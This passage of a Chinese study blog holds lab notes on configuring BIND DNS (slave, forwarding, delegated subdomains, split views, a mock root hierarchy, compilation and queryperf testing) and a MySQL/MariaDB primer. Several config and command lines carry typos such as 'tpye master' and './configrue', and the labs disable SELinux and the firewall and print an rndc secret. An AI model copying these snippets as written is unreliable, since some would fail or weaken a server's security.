&#125;; allow-transfer &#123; none;&#125;;···&#125;;]#vim /etc/named.rfc1912.zoneszone &quot;ZONE_NAME&quot; IN &#123; type slave; masters &#123; 192.168.1.9; &#125;; file &quot;slaves/feng.com.zone&quot;;&#125;;]#systemctl start named ]#ll /var/named/slaves/ #重启服务后立即生成配置的文件total 4-rw-r--r-- 1 named named 415 Jun 3 13:32 feng.com.zone 实验3.实现DNS的转发中间DNS服务器192.168.1.8(全局/局部) 12345678910111213141516options &#123;··· listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; &#125;; forward first|only; #first首先转发forward IP;only只转发forward IP; forwarders &#123; 192.168.1.9;&#125;;··· dnssec-enable no; dnssec-validation no; #关闭dnssec功能中间DNS服务器(局部域名转发)zone &quot;feng.com&quot; IN &#123; type forward; forward first|only; forwarders &#123; 192.168.1.9;&#125;;&#125;;192.168.1.9的DNS正向服务器解析配置参照实验1配置即可。 实验4.子域的配置三种方法： 当成父域的一条记录 子域，本机的独立域名 委派给另一台主机维护子域(主要应用) 父域：192.168.1.9 www.feng.com 子域：192.168.1.8 www.bj.feng.com 123456789101112131415161718192021]# vim /etc/named.conf listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; &#125;; dnssec-enable no; dnssec-validation no; #关闭dnssec功能···]#vim /etc/named.rfc1912.zoneszone &quot;feng.com&quot; IN &#123; type master; file &quot;feng.com.zone&quot;;&#125;;]#vim /var/named/feng.com.zone $TTL 86400@ IN SOA dns1.feng.com. admin.feng.com. (1 1D 2H 1W 3H) NS dns1.feng.com.bj NS dns2.feng.com. ##增加这条ns sh NS dns3.feng.com. dns1 A 192.168.1.9dns2 A 192.168.1.8 ##增加这条A记录dns3 A 192.168.1.7 ]#systemctl start named #配置完毕，启动服务 在子域192.168.1.8配置bj.feng.com域名即可 在子域192.168.1.7配置sh.feng.com域名即可，参照实验1即可 实验5.实现智能DNS需求： 192.168.1.0/24 本地的网段访问www.feng.com的时候，DNS解析为192.168.1.10 非192.168.1.0/24 外部的网段访问www.feng.com的时候，DNS解析为192.168.1.11 注意： view语句块必须包含所有的zone，所有需要把.(root)域转移到/etc/named.rfc1912.zones。进行模块化的管理。 实验DNS服务器：192.168.1.9/24 ; 172.20.1.24/16 /etc/named.conf文件配置123456789101112131415161718]#vim /etc/named.confacl bjnet &#123; 192.168.1.0/24;&#125;;acl othernet &#123;!192.168.1.0/24;any;&#125;;/*zone &quot;.&quot; IN &#123; type hint; file &quot;named.ca&quot;;&#125;;*/view &quot;bjnet&quot; &#123; match-clients &#123;&quot;bjnet&quot;;&#125;; include &quot;/etc/named.rfc1912.zones.bj&quot;;&#125;;view &quot;othernet&quot; &#123; match-clients &#123;&quot;othernet&quot;;&#125;; include &quot;/etc/named.rfc1912.zones&quot;;&#125;;// include &quot;/etc/named.rfc1912.zones&quot;; 配置zone文件1234567891011121314151617181920]#cp -p /etc/named.rfc1912.zones /etc/named.rfc1912.zones.bj]#vim /etc/named.rfc1912.zones.bjzone &quot;.&quot; IN &#123; type hint; file &quot;named.ca&quot;;&#125;;zone &quot;feng.com&quot; IN &#123; type master; file &quot;feng.com.zone.bj&quot;;&#125;;]#vim /etc/named.rfc1912.zoneszone &quot;.&quot; IN &#123; type hint; file &quot;named.ca&quot;;&#125;;zone &quot;feng.com&quot; IN &#123; tpye master; file &quot;feng.com.zone&quot;;&#125;; 数据库文件配置123456789101112131415]#vim /var/named/feng.com.zone$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com.dns1 A 192.168.1.9websrv A 192.168.1.10www CNAME websrv]#vim /var/named/feng.com.zone.bj$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com.dns1 A 192.168.1.9websrv A 192.168.1.11www CNAME websrv]#systemctl start named #配置好，启动服务 实验6.搭建互联网模型的dns场景:.(root)服务器,com.服务器,feng.com服务器,www.feng.com主机,电信转发服务器,clinets 主机：centos7.4 .(root):192.168.1.1 com.:192.168.1.2 feng.com.:192.168.1.3 从：192.168.1.33 高可用 www.feng.com.: 192.168.1.4 负载均衡备用主机：192.168.1.44 DNStrans:192.168.1.5 clients：192.168.1.6 实验综合条件：每台dns服务器的要求 关闭防火墙 selinux策略为disabled 安装好bind服务 123456]#getenforce Disabled]#systemctl stop firewalld]#yum install bind -y]#rpm -qf /usr/sbin/namedbind-9.8.2-0.62.rc1.el6.x86_64 根服务器的配置ip为：192.168.1.1 12345678910111213141516171819202122232425]# vim /etc/named.conf listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; &#125;; dnssec-enable no; dnssec-validation no; #关闭dnssec功能，需要委派···/*zone &quot;.&quot; IN &#123; tpye hint; file &quot;named.ca&quot;;&#125;;*/]#vim /etc/named.rfc1912.zoneszone &quot;.&quot; IN &#123; type master; file &quot;root.zone&quot;;&#125;;]#vim /var/named/root.zone$TTL 86400@ IN SOA dns1. admin. (1 1D 2H 1W 3H) NS dns1com NS dns2 #委派子域com.dns1 A 192.168.1.1dns2 A 192.168.1.2]#systemctl start named #配置完毕，启动服务 搭建区域dns服务器ip为192.168.1.5 1234567891011]# vim /etc/named.conf listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; &#125;; dnssec-enable no; dnssec-validation no; #关闭dnssec功能，需要转发···]#vim /var/named/named.ca. 518400 IN NS a.root-servers.net.a.root-servers.net. 3600000 IN A 192.168.1.1 #把CDN服务器指向已经搭好的根服务器IP]#systemctl start named 搭建com.服务器：IP为192.168.1.21234567891011121314151617181920]# vim /etc/named.conf listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; &#125;; dnssec-enable no; dnssec-validation no; #关闭dnssec功能，需要委派]#vim /etc/named.rfc1912.zoneszone &quot;com&quot; IN &#123; type master; file &quot;com.zone&quot;&#125;;]#vim /var/named/com.zone$TTL 86400@ IN SOA dns1.com. admin.com. (1 1D 2H 1W 3H) NS dns1feng NS dns2 #委派子域feng.com.feng NS dns3dns1 A 192.168.1.2dns2 A 192.168.1.3dns3 A 192.168.1.33]#systemctl start named 搭建feng.com.服务器主：192.168.1.3 从：192.168.1.33 主服务器配置；1234567891011121314151617181920]#vim /etc/named.conf listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; &#125;; allow-transfer &#123; 192.168.1.33; &#125;; #只允许slave_ip传输]#vim /etc/named.rfc1912.zoneszone &quot;feng.com&quot; IN &#123; type master; file &quot;feng.com.zone&quot;;&#125;;]#vim /var/named/feng.com.zone$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com. NS dns2.feng.com.dns1 A 192.168.1.3dns2 A 192.168.1.33websrv A 192.168.1.4websrv A 192.168.1.44www CNAME websrv]#systemctl start named 从服务器配置；123456789101112131415161718]#vim /etc/named.confoptions &#123; listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; &#125;; allow-transfer &#123; none;&#125;;···&#125;;]#vim /etc/named.rfc1912.zoneszone &quot;ZONE_NAME&quot; IN &#123; type slave; masters &#123; 192.168.1.3; &#125;; file &quot;slaves/feng.com.zone&quot;;&#125;;]#systemctl start named ]#ll /var/named/slaves/ #重启服务后立即生成配置的文件total 4-rw-r--r-- 1 named named 415 Jun 3 13:32 feng.com.zone 5.搭建www.feng.com主：192.168.1.4 备：192.168.1.44 192.168.1.4主机：12345]#yum install httpd -y]#setenforce 0]#echo welcome to testsrv1 &gt;&gt; /var/www/html/index.html]#systemctl start httpd]#systemctl stop firewalld 192.168.1.44备用机：12345]#yum install httpd -y]#setenforce 0]#echo welcome to testsrv2 &gt;&gt; /var/www/html/index.html]#systemctl start httpd]#systemctl stop firewalld 6.clients访问dig或者host命令是bind包 12345678910111213141516171819202122232425262728]#rpm -qf /usr/bin/digbind-utils-9.9.4-61.el7.x86_64]#rpm -q bind &amp;&gt; /dev/null || yum install -y bind]#dig www.feng.com @192.168.1.5]#host www.feng.com 192.168.1.5]#vim /etc/resolv.confnameserver 192.168.1.5]#for i in &#123;1..20&#125; ;do curl www.feng.com ;donewelcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2welcome to testsrv1welcome to testsrv2 自此，实现了互联网的DNS负载均衡。 编译安装bind编译安装bind及启动rndc服务DNS服务目标： 开启dns服务，启用rndc服务 编译前准备1234]#yum groupinstall &quot;devlopment tools&quot;]#yum install openssl-devel -y]#useradd -r -d /var/named -u 25 -s /sbin/nologin -m named]#./configrue --prefix=/app/bind 编译123]#make -j 4 &amp;&amp; make install ]#vim /etc/profile.d/bind.shPATH=/app/bind/bin:/app/bind/sbin:$PATH 修改相关配置文件12345678910111213141516]#vim /app/bind/etc/named.confoptions &#123; directory &quot;/var/named&quot;;&#125;;zone &quot;feng.com&quot; &#123; type master; file &quot;feng.com.zone&quot;;&#125;;zone &quot;.&quot; &#123; type hint; file &quot;named.ca&quot;;&#125;;]#chgrp named /app/bind/etc/named.conf]#chmod 640 /app/bind/etc/named.conf]#mkdir /var/named/]#dig -t ns . @a.root-servers.net &gt; /var/named/named.ca 修改zone文件，配置dns服务12345678910111213141516171819202122]#vim /var/named/feng.com.zone$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1dns1 A 192.168.1.9websrv A 192.168.1.10websrv A 192.168.1.11www CNAME websrv]#named -u named -g -d 3 ]#named -u named -d 3 #dns基本配置完成，后台启用服务]#rndc-confgen &gt; /app/bind/etc/rndc.conf]#grep &apos;^#&apos; /app/bind/etc/rndc.conf &gt;&gt; /app/bind/etc/named.conf]#vim /app/bind/etc/named.conf #去掉rndc配置的相关的#号key &quot;rndc-key&quot; &#123; algorithm hmac-sha256; secret &quot;sTvCPeQfkCmaObjPsnXXpqqryxkse4EmWUQylO4Wl5M=&quot;;&#125;;controls &#123; inet 127.0.0.1 port 953 allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;&#125;;]#killall -HUP named #重新加载配置文件,dns服务重启成功 querperf测试编译querperf12345]#cd /root/bind-9.13.0/contrib/queryperf]#./configure ]#make]#cp queryperf /app/bind/bin/ ]#vim /root/dnstest.txt 测试12345678910111213141516171819202122232425262728293031www.feng.com Afeng.com NSfeng.com SOAfeng.com MX ]#cat &gt;&gt; /root/dnstest.txt &lt; /root/dnstest.txt #生成大文件]#sed -i &apos;100000,$d&apos; /root/dnstest.txt #取前100000行]#queryperf -d /root/dnstest.txtStatistics: Parse input file: once Ended due to: reaching end of file Queries sent: 4055040 queries Queries completed: 4055040 queries Queries lost: 0 queries Queries delayed(?): 0 queries RTT max: 1.629313 sec RTT min: 0.000057 sec RTT average: 0.004647 sec RTT std deviation: 0.008495 sec RTT out of range: 0 queries Percentage completed: 100.00% Percentage lost: 0.00% Started at: Sat Jun 2 23:03:40 2018 Finished at: Sat Jun 2 23:19:26 2018 Ran for: 945.913922 seconds Queries per second: 4286.901700 qps 以上内容为学习过程]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL(二)]]></title>
    <url>%2Fhexo-mysql2.html</url>
    <content type="text"><![CDATA[数据库基础传统的文件系统管理的缺陷编写应用程序不方便；数据冗余不可避免；应用程序依赖性；不支持对文件的并发访问；数据间联系弱；难以按用户视图表示数据；无阶段性安全控制功能. 数据库管理系统的优点相互关联的数据的集合；较少的数据冗余；程序与数据相互独立；保证数据的安全、可靠；最大限度地保证数据的正确性；数据可以并发使用并能同时保证一致性. 数据库管理系统数据库是数据的汇集，它以一定的组织形式存于存储介质上DBMS是管理数据库的系统软件，它实现数据库系统的各种功能。是数据库系统的核心DBA：负责数据库的规划、设计、协调、维护和管理等工作应用程序指以数据库为基础的应用程序; 单机架构;大型主机/终端架构;主从分布式(C/S); MYSQL,ORICAL分布式架构; 关系型数据Key/Value数据库 关系 ：关系就是二维表。并满足如下性质： 表中的行、列次序并不重要 行row：表中的每一行，又称为一条记录(record) 列column：表中的每一列，称为属性，字段 主键（Primary key）：用于惟一确定一个记录的字段 域domain：属性的取值范围，如，性别只能是‘男’和‘女’两个值 外键（Foreign key):用于表之间的一对多的关系 唯一键(Uniq key):可以为null，非关系型数据库：NO SQL (not only SQL) mencached redis mogoDBRDBMS： MySQL: MySQL, MariaDB, Percona Server PostgreSQL: 简称为pgsql，EnterpriseDB Oracle： MSSQL： DB2:事务tansaction：多个操作被当作一个整体对待 ACID: A:原子性 C:一致性 I:隔离性 D:持久性 事务未撤销，形成的数据为:dirty data 数据三要素数据结构： ​ 一类是与数据类型、内容、性质有关的对象，比如关系模型中的域、属性和关系等； 另一类是与数据之间联系有关的对象，它从数据组织层表达数据记录与字段的结构 数据的操作： ​ 数据提取：在数据集合中提取感兴趣的内容。SELECT 数据更新：变更数据库中的数据。INSERT、DELETE、UPDATE 数据的约束条件 ：是一组完整性规则的集合： ​ 实体(行)完整性 Entity integrity 域(列)完整性 Domain Integrity 参考完整性 Referential Integrity 数据库的正规化分析RDMBS设计范式基础概念—物理层 ​ 设计关系数据库时，遵从不同的规范要求，设计出合理的关系型数据库，这些不同的规范要求被称为不同范式，各种范式呈递次规范，越高的范式数据库冗余越小 目前关系数据库有六种范式：—逻辑层 ​ 第一范式（1NF）、第二范式（2NF）、第三范式（3NF）、巴德斯科范式（BCNF）、第四范式(4NF）和第五范式（5NF，又称完美范式）。满足最低要求的范式是第一范式（1NF）。在第一范式的基础上进一步满足更多规范要求的称为第二范式（2NF），其余范式以次类推。一般说来，数据库只需满足第三范式(3NF）即可范式 1NF：无重复的列，每一列都是不可分割的基本数据项，同一列中不能有多个值，即实体中的某个属性不能有多个值或者不能有重复的属性。除去同类型的字段，就是无重复的列 说明：第一范式（1NF）是对关系模式的基本要求，不满足第一范式（1NF）的数据库就不是关系数据库; ​ 2NF：属性完全依赖于主键，第二范式必须先满足第一范式，要求表中的每个行必须可以被唯一地区分。通常为表加上一个列，以存储各个实例的唯一标识PK，非PK的字段需要与整个PK有直接相关性; ​ 3NF：属性不依赖于其它非主属性，满足第三范式必须先满足第二范式。第三范式要求一个数据库表中不包含已在其它表中已包含的非主关键字信息，非PK的字段间不能有从属关系; 为了性能，某些数据库不满足范式，增加了数据库的冗余. MYSQL概念历史发展 1979年：TcX公司 Monty Widenius，Unireg 1996年：发布MySQL1.0，Solaris版本，Linux版本 1999年：MySQL AB公司，瑞典 2003年：MySQL 5.0版本，提供视图、存储过程等功能 2008年：Sun 收购 2009年：Oracle收购sun 2009年：Monty成立MariaDB 启动MariaDB服务初识数据库12345678910111213141516171819202122]#systemctl start mariadb]#mysqlMariaDB [(none)]&gt;drop database test; #删除数据库testMariaDB [(none)]&gt;use mysql;MariaDB [mysql]&gt; statusMariaDB [mysql]&gt; create database testdb;Query OK, 1 row affected (0.00 sec)MariaDB [mysql]&gt; \! ls /var/lib/mysqlMariaDB [mysql]&gt; SELECT user,password,host FROM user;]#mysql_secure_installation #设置mysql密码]#mysql -uroot -p #输入密码MariaDB [mysql]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema |+--------------------+MariaDB [mysql]&gt; SELECT user,host,password FROM user;MariaDB [mysql]&gt; SELECT * FROM user\G;MariaDB [mysql]&gt;quit 交互式命令 可以接受输入重定向。可以source 12]#mysql -uroot -proot &lt; test.sqlMariaDB [(none)]&gt; source test.sql 客户端命令 可以不用加”;”结束语句 12345678910111213141516171819202122232425Note that all text commands must be first on line and end with &apos;;&apos;? (\?) Synonym for `help&apos;.clear (\c) Clear the current input statement.connect (\r) Reconnect to the server. Optional arguments are db and host.delimiter (\d) Set statement delimiter.edit (\e) Edit command with $EDITOR.ego (\G) Send command to mysql server, display result vertically.exit (\q) Exit mysql. Same as quit.go (\g) Send command to mysql server.help (\h) Display this help.nopager (\n) Disable pager, print to stdout.notee (\t) Don&apos;t write into outfile.pager (\P) Set PAGER [to_pager]. Print the query results via PAGER.print (\p) Print current command.prompt (\R) Change your mysql prompt.quit (\q) Quit mysql.rehash (\#) Rebuild completion hash.source (\.) Execute an SQL script file. Takes a file name as an argument.status (\s) Get status information FROM the server.system (\!) Execute a system shell command.tee (\T) Set outfile [to_outfile]. Append everything into given outfile.use (\u) Use another database. Takes database name as argument.charset (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.warnings (\W) Show warnings after every statement.nowarning (\w) Don&apos;t show warnings after every statement. 修改MariaDB环境变量shell的环境变量；123]#vim /etc/profile.d/mysql.shexport MYSQL_PS1=&quot;(\u@\h) [\d]&gt; &quot;]#. /etc/profile.d/mysql.sh 命令行的选项改变mariadb_PS1;1234MariaDB [(none)]&gt; prompt \u@[\D]---&gt;PROMPT set to &apos;\u@[\D]---&gt;&apos;root@[Mon Jun 4 23:08:30 2018]---&gt;]#mysql --prompt=&quot;(\u@\h) [\d]&gt; &quot; /etc/my.cnf.d/mysql-clients.cnf的文件修改1234]#vim /etc/my.cnf.d/mysql-clients.cnf [mysql]prompt=(\\u@\\h) [\\d]&gt;\\_ Mysql客户端选项123456789101112131415161718192021mysql客户端可用选项：-A, --no-auto-rehash 禁止补全-u, --user= 用户名,默认为root-h, --host= 服务器主机,默认为localhost-p, --passowrd= 用户密码,建议使用-p,默认为空密码-P, --port= 服务器端口-S, --socket= 指定连接socket文件路径-D, --database= 指定默认数据库-C, --compress 启用压缩-e &quot;SQL&quot; 执行SQL命令-V, --version 显示版本-v --verbose 显示详细信息--print-defaults 获取程序默认使用的配置]#mysql -e &quot;show databases;&quot;+--------------------+| Database |+--------------------+| information_schema || mysql || test |+--------------------+ 数据库操作SQL规范 在数据库系统中，SQL语句不区分大小写(建议用大写) 但字符串常量区分大小写 SQL语句可单行或多行书写，以“;”结尾 关键词不能跨多行或简写 用空格和缩进来提高语句的可读性 子句通常位于独立行，便于编辑，提高可读性 注释： SQL标准： /注释内容/ 多行注释 – 注释内容 单行注释，注意有空格 MySQL注释：# 数据库的组件(对象)：数据库、表、索引、视图、用户、存储过程、函数、触发器、事件调度器等 命名规则： 必须以字母开头 可包括数字和三个特殊字符（# _ $） 不要使用MySQL的保留字 同一database(Schema)下的对象不能同名 数据库操作创建数据库：123CREATE DATABASE|SCHEMA [IF NOT EXISTS] &apos;DB_NAME&apos;;CHARACTER SET &apos;character set name&apos;COLLATE &apos;collate name&apos; 删除数据库 DROP DATABASE|SCHEMA [IF EXISTS] &#39;DB_NAME&#39;; 查看支持所有字符集：SHOW CHARACTER SET; 查看支持所有排序规则：SHOW COLLATION; 获取命令使用帮助：mysql&gt; HELP KEYWORD; 查看数据库列表：mysql&gt; SHOW DATABASES; 例如： 123456789101112MariaDB [(none)]&gt; \! ls /var/lib/mysqlaria_log.00000001 aria_log_control ibdata1 ib_logfile0 ib_logfile1 mysql mysql.sock performance_schema testMariaDB [(none)]&gt; CRAETE DATABASE DB1;MariaDB [(none)]&gt; \! cat /var/lib/mysql/DB1/db.optdefault-character-set=latin1default-collation=latin1_swedish_ciMariaDB [(none)]&gt; SHOW CHARACTER SET; #排序规则MariaDB [(none)]&gt; DROP DATABASE DB1; #删除数据库DB1MariaDB [(none)]&gt; USE DB1Database changedMariaDB [DB1]&gt; SHOW TABLES;Empty set (0.00 sec) create database sytanx 表的操作选择正确的数据类型对于获得高性能至关重要，三大原则： 更小的通常更好，尽量使用可正确存储数据的最小数据类型 简单就好，简单数据类型的操作通常需要更少的CPU周期 尽量避免NULL，包含为NULL的列，对MySQL更难优化 表操作 查看所有的引擎：SHOW ENGINES 查看表：SHOW TABLES [FROM db_name] 查看表结构：DESC [db_name.]tb_name 删除表：DROP TABLE [IF EXISTS] tb_name 查看表创建命令：SHOW CREATE TABLE tbl_name 查看表状态：SHOW TABLE STATUS LIKE &#39;tbl_name&#39; 查看库中所有表状态： SHOW TABLE STATUS FROM db_name 修改表：不建议修改，修改请备份 1234567891011MariaDB [DB1]&gt; create table student ( id tinyint unsigned not null primary key,name char(10) not null, phone char(11),sex char(1) );MariaDB [DB1]&gt; desc student;MariaDB [DB1]&gt; show table status like &apos;student&apos;\G;MariaDB [DB1]&gt; create table emp ( id int unsigned auto_increment primary key, name varchar(30) not null, sex char(1) default &apos;m&apos;, addresss varchar(100) ) engine=innodb default charset=utf8;Query OK, 0 rows affected (0.01 sec)MariaDB [DB1]&gt; show create table emp\G;MariaDB [DB1]&gt; create table user SELECT user,host,password FROM mysql.user;MariaDB [DB1]&gt; create table user2 SELECT user,host,password FROM mysql.user where 1 = 0;MariaDB [DB1]&gt; create table user3 like mysql.user;MariaDB [DB1]&gt; desc user2; set多选 enum二选一 primary key 主键绑定name,city; MariaDB [DB1]&gt; create table t1 ( name char(30),city char(30), sex char(1),primary key(name,city)); DML语句insert12345MariaDB [DB1]&gt; insert student values(1,&apos;bai&apos;,&apos;10086&apos;,&apos;m&apos;);MariaDB [DB1]&gt; insert student(id,name) values(70,&apos;wang&apos;);MariaDB [DB1]&gt; insert student(id,name,sex) values(2,&apos;wang&apos;,&apos;m&apos;),(3,&apos;lin&apos;,&apos;f&apos;);MariaDB [DB1]&gt; insert student set id=4,name=&apos;zhao&apos;;MariaDB [DB1]&gt; insert emp(name,addresss) SELECT user,host FROM user; update12MariaDB [DB1]&gt; update emp set name=&apos;admin&apos;,addresss=&apos;beijing&apos; where id=1;MariaDB [DB1]&gt; update emp set name=&apos;admin&apos;,addresss=&apos;beijing&apos; where name=&apos;root&apos; LIMIT 2; delete:慎用12MariaDB [DB1]&gt; truncate table emp;MariaDB [DB1]&gt; delete FROM emp where id=4; mysql -U 安全模式123]# vim /etc/my.cnf/mysql-clients.cnf[mysql]safe-updates DQL语句SELECT磁盘的数据排放形式来SELECT syntax: 12345678910111213141516171819202122SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] SELECT_expr [, SELECT_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE &apos;file_name&apos; [CHARACTER SET charset_name] export_options | INTO DUMPFILE &apos;file_name&apos; | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 单表操作123456789101112MariaDB [DB1]&gt; SELECT &apos;hello world&apos;;+-------------+| hello world |+-------------+| hello world |+-------------+MariaDB [DB1]&gt; SELECT &apos;1+2&apos;,1+2 ;+-----+-----+| 1+2 | 1+2 |+-----+-----+| 1+2 | 3 |+-----+-----+ where子句123456MariaDB [DB1]&gt; SELECT * FROM user where host=&apos;localhost&apos;;MariaDB [DB1]&gt; SELECT * FROM student where sex is null;MariaDB [DB1]&gt; SELECT * FROM student where id &gt;=2 and id &lt;=5;MariaDB [DB1]&gt; SELECT * FROM student where sex in (&apos;f&apos;,&apos;m&apos;);MariaDB [DB1]&gt; SELECT * FROM student where sex in (&apos;f&apos;,&apos;m&apos;) or sex is null;MariaDB [DB1]&gt; SELECT id as 编号,name 姓名 FROM student where sex in (&apos;f&apos;,&apos;m&apos;) or sex is null; #别名 where子句模糊查询 %：任意长度的任意字符 _：任意单个字符 RLIKE：正则表达式，索引失效，不建议使用 REGEXP：匹配字符串可用正则表达式书写模式，同上 逻辑操作符： NOT：!= AND: OR XOR group order by 升序：ASC 降序:DESC 123MariaDB [DB1]&gt; SELECT * FROM student order by score ;MariaDB [DB1]&gt; SELECT * FROM student order by -score desc;MariaDB [DB1]&gt; SELECT * FROM student order by score LIMIT 3 ; FOR UPDATE LOCK IN SHARE MODE SQL JOINS LEFT OUTER JOIN ringt outer join full join 多表查询 1234MariaDB [hellodb]&gt; SELECT s.name as s_name,t.name as t_name FROM students as s INNER JOIN teachers as t on s.teacherid=t.tid;MariaDB [hellodb]&gt; SELECT s.name as s_name,t.name as t_name FROM students as s LEFT OUTER JOIN teachers as t on s.teacherid=t.tid;MariaDB [hellodb]&gt; SELECT s.name as s_name,t.name as t_name FROM students as s RIGHT OUTER JOIN teachers as t on s.teacherid=t.tid;MariaDB [hellodb]&gt; SELECT st.name,sc.score FROM students as st INNER JOIN scores as sc on st.stuid=sc.stuid and score &gt; (SELECT AVG(score) FROM scores); 子查询 1MariaDB [hellodb]&gt; SELECT st.name,sc.score FROM students as st INNER JOIN scores as sc on st.stuid=sc.stuid and score &gt; (SELECT AVG(score) FROM scores); view 类似shell中的别名 123MariaDB [hellodb]&gt; create view view_oldstu as SELECT * FROM students where age &gt;50;MariaDB [hellodb]&gt; SELECT * FROM view_oldstu;MariaDB [hellodb]&gt; drop view view_oldstu; functions 查看函数列表： SHOW FUNCTIOIN STATUS; 查看函数定义 SHOW CREATE FUNCTION function_name 删除UDF: DROP FUNCTION function_name 调用自定义函数语法: SELECT function_name(parameter_value,…)123456789MariaDB [db1]&gt; DELIMITER // -&gt; CREATE FUNCTION deleteById(uid SMALLINT UNSIGNED) RETURNS VARCHAR(20) -&gt; BEGIN -&gt; DELETE FROM students WHERE stuid = uid; -&gt; RETURN (SELECT COUNT(uid) FROM students); -&gt; END//MariaDB [db1]&gt; DELIMITER ;MariaDB [db1]&gt; SELECT deleteById（10）MariaDB [db1]&gt; SELECT * FROM mysql.proc 存储过程 存储过程优势: 存储过程把经常使用的SQL语句或业务逻辑封装起来,预编译保存在数据库中,当需要时从数据库中直接调用,省去了编译的过程 提高了运行速度 同时降低网络数据传输量 存储过程与自定义函数的区别:存储过程实现的过程要复杂一些,而函数的针对性较强存储过程可以有多个返回值,而自定义函数只有一个返回值存储过程一般独立的来执行,而函数往往是作为其他SQL语句的一部分来使用 存储过程和函数中可以使用流程控制来控制语句的执行 流程控制： 如下： IF：用来进行条件判断。根据是否满足条件，执行不同语句 CASE：用来进行条件判断，可实现比IF语句更复杂的条件判断 LOOP：重复执行特定的语句，实现一个简单的循环 LEAVE：用于跳出循环控制 ITERATE：跳出本次循环，然后直接进入下一次循环 REPEAT：有条件控制的循环语句。当满足特定条件时，就会跳出循环语句 WHILE：有条件控制的循环语句 MySQL用户和权限管理用户 元数据数据库：mysql 系统授权表： db, host, user columns_priv, tables_priv, procs_priv, proxies_priv 用户账号： ‘USERNAME‘@’HOST’： @’HOST’: 主机名； IP地址或Network; 通配符： %, _: 172.16.%.% 1234MariaDB [mysql]&gt; create user hong@&apos;192.168.1.11&apos; identified by &apos;centos&apos;;MariaDB [mysql]&gt; RENAME USER old_user_name TO new_user_nameMariaDB [mysql]&gt; DROP USER &apos;&apos;@&apos;localhost&apos;; #删除空用户MariaDB [mysql]&gt; DROP USER &apos;USERNAME&apos;@&apos;HOST 密码正常修改密码 1234MariaDB [mysql]&gt; SET PASSWORD FOR &apos;user&apos;@&apos;host&apos; = PASSWORD(‘password&apos;);MariaDB [mysql]&gt; UPDATE mysql.user SET password=PASSWORD(&apos;password&apos;) WHERE clause;MariaDB [mysql]&gt; FLUSH PRIVILEGES;]# mysqladmin -u root –poldpass password &apos;newpass&apos; 忘记管理员密码的解决办法 12345678910]#systemctl stop mariadb]#vim /etc/my.cnf [mysqld]--skip-grant-tables ]#systemctl restart mariadb]#mysqlMariaDB [mysql]&gt; update user set password=password(&apos;centos6&apos;) where user=&apos;root&apos; ;]#sed -i &apos;s/--skip-grant-tables//&apos; /etc/my.cnf #删除刚添加的那行]#systemctl restart mariadb]#mysql -pcentos6 权限123456MariaDB[hellodb]&gt; grant all on hellodb.* to hong@&apos;192.168.1.%&apos;;MariaDB[hellodb]&gt; grant select,insert on hellodb.* to mage@&apos;%&apos; identified by &apos;centos&apos;;MariaDB[hellodb]&gt; show grants for mage@&apos;%&apos;;MariaDB[hellodb]&gt; show grants for hong@&apos;192.168.1.%&apos;;MariaDB[hellodb]&gt; REVOKE SELECT ON hellodb.* FROM &apos;mage&apos;@&apos;%;MariaDB[hellodb]&gt; FLUSH PRIVILEGES; 注意：MariaDB服务进程启动时会读取mysql库中所有授权表至内存 GRANT或REVOKE等执行权限操作会保存于系统表中，MariaDB的服务进 程通常会自动重读授权表，使之生效 对于不能够或不能及时重读授权表的命令，可手动让MariaDB的服务进程 重读授权表：MariaDB[hellodb]&gt; FLUSH PRIVILEGES; 参考官方授权 练习1.练习一导入hellodb.sql生成数据库: 在students表中，查询年龄大于25岁，且为男性的同学的名字和年龄 以ClassID为分组依据，显示每组的平均年龄 显示第2题中平均年龄大于30的分组及平均年龄 显示以L开头的名字的同学的信息 显示TeacherID非空的同学的相关信息 以年龄排序后，显示年龄最大的前10位同学的信息 查询年龄大于等于20岁，小于等于25岁的同学的信息 answer: SELECT Name,Age FROM students WHERE Age &gt;25 AND Gender=&#39;M&#39;; SELECT avg(age),ClassID FROM students WHERE ClassID IS NOT NULL GROUP BY ClassID ; SELECT avg(Age),ClassID FROM students WHERE ClassID IS NOT NULL GROUP BY ClassID HAVING avg(Age) &gt; 30; MariaDB [hellodb]&gt; SELECT * FROM students WHERE Name LIKE &#39;L%&#39;; MariaDB [hellodb]&gt; SELECT * FROM students WHERE TeacherID IS NOT NULL; MariaDB [hellodb]&gt; SELECT * FROM students ORDER BY Age DESC LIMIT 10; 